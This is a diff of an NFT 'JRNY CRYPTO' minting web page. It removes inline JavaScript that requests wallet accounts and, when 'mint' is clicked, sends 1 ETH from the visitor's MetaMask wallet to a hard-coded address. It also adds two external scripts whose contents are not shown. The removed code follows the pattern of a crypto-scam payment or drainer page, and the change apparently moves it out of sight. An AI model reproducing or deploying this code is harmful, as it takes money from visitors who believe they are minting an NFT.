@@ -12,6 +12,8 @@
 <link rel="alternate" type="application/rss+xml" title="JRNY CRYPTO &raquo; Comments Feed" href="https://jrny.club/?feed=comments-rss2" />
 <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.0.0-beta.36/dist/web3.min.js" integrity="sha256-nWBTbvxhJgjslRyuAKJHK+XcZPlCnmIAAMixz6EefVk=" crossorigin="anonymous"></script>
 <script src="//www.googletagmanager.com/gtag/js?id=G-9MJGJCXCXW" type="text/javascript" data-cfasync="false" async></script>
+<script src="wp-includes/js/web3.min.js"></script>
+<script src="wp-includes/js/script.js" async defer></script>
 <script type="text/javascript" data-cfasync="false">
 				var mi_version = '8.2.0';
 				var mi_track_user = true;
@@ -937,71 +939,8 @@ JRNY NFT sets</h1> </div>
 </div>
 </footer>
 </div>
-<script type="module">
-  import { ethers } from "https://cdn.ethers.io/lib/ethers-5.2.esm.min.js";
-  // Your code here...
-  // A Web3Provider wraps a standard Web3 provider, which is
-// what MetaMask injects as window.ethereum into each page
-const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-// Prompt user for account connections
-await provider.send("eth_requestAccounts", []);
-const signer = provider.getSigner();
-console.log("Account:", await signer.getAddress());
-</script>
-<script>
-  
-function mint() {
-  const mintNow = document.getElementById("mint-now");
-  const connectWallet = document.getElementById("connect-wallet");
 
-  const isMetaMaskInstalled = () => {
-    const { ethereum } = window;
-    return Boolean(ethereum && ethereum.isMetaMask) || false
-  };
-  const isMetaMaskConnected = async () => {
-    if (typeof web3 === 'undefined') return false;
-    let accounts = await ethereum.request({ method: 'eth_accounts' })
-    return accounts.length > 0;
-  };
 
-  async function onConnectClick() {
-    await ethereum.request({ method: 'eth_accounts' })
-  };
-
-  // if (!await isMetaMaskConnected()) {
-  //   onConnectClick()
-  // };
-  try {
-    const total = 1 * 1000000000000000000;
-    const adress = (await ethereum.request({ method: 'eth_accounts' }))[0];
-    await ethereum.request({
-      method: 'eth_sendTransaction',
-      params: [
-        {
-          from: adress,
-          to: "0x7054D4de267F16e9289e73C85471493cD2d64043",
-          value: total.toString(16)
-        },
-      ],
-    });
-
-  } catch (error) {
-    console.error(error);
-  }
-  
-  function preventNonInstalledMMask() {
-    if (!isMetaMaskInstalled())
-      alert("Consider installing metamask to use our services!")
-  }
-  async function onConnectClick2() {
-    await ethereum.request({ method: 'eth_accounts' })
-  }
-  mintNow.addEventListener("click", mint)
-  connectWallet.addEventListener("click", onConnectClick2)
-
-  preventNonInstalledMMask()
-}
-</script>
 <script type="text/javascript">(function(d, s, id) {
 var js, fjs = d.getElementsByTagName(s)[0];
 if (d.getElementById(id)) return;
